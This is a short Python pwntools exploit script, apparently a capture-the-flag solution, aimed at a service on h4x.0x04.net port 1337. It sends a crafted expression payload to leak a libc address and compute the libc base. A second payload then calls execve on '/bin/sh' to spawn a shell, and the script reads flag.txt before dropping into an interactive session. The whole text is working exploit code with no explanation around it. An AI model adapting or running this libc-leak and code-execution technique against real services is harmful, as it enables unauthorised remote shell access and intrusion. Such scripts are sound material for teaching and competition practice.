from pwn import *

p = log.progress("Leaking")
with context.local(log_level='error'):
    libc = ELF("./libc.so")
    c = connect("h4x.0x04.net", 1337)

# LIBC
payload = "0+"*19  + "(++0)"
c.sendline(payload)
p.success()

print("")

libc_start_main = c.readline()
libc_start_main = u32(p32(int(libc_start_main), sign=True))
libc_start = libc_start_main - libc.symbols["__libc_start_main"] - 250

log.info("LIBC: " + hex(libc_start))

# PAYLOAD
execve = libc_start + libc.symbols["execve"]
binsh = libc_start + 1439057

log.info("EXECVE: " + hex(execve))
log.info("BINSH: " + hex(binsh))

payload = (35)*"(" + str(int(execve)) + "+" + str(int(binsh)) + "(0+0+0)"
c.sendline(payload)
c.read()

print("")
c.sendline("cat flag.txt")
print("FLAG: " + c.readline())
c.interactive()

c.close()
